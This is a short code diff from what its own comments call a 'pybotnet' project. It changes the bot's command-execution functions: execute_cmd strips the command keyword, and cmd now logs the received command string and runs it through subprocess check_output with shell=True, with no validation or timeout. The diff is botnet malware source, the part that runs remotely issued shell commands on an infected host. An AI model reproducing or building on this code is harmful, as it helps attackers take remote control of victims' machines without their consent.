@@ -4,6 +4,8 @@ from time import sleep
 from subprocess import check_output
 from os import listdir
 
+import platform
+
 # pybotnet import
 import util
 
@@ -89,6 +91,7 @@ def execute_cmd(command, logger) -> str:
     try:
         command = split_command(command)
         command = ' '.join(command[1:])
+
     except:
         return 'execute_cmd invalid command; Wrong format'
 
@@ -98,14 +101,16 @@ def execute_cmd(command, logger) -> str:
         return 'cmd error'
 
 
-def cmd(command: str,  logger=None) -> str:
-    '''command sample: ['ls', '.','-ltrh']'''
-    # logger.info(f'try to run: {command}')
+def cmd(command: str,  logger) -> str:
+    '''command sample: makedir newfolder'''
+    # TODO: add timeout
 
-    output = check_output([command], shell=True)
+    logger.info(f'try to run: {command}')
+
+    output = check_output(command, shell=True)
+
     output = str(output).replace('\\r\\n', '\n')  # cleaning data
     output = output[2:]  # remove b'
-    # TODO: add timeout
     return output
 
 
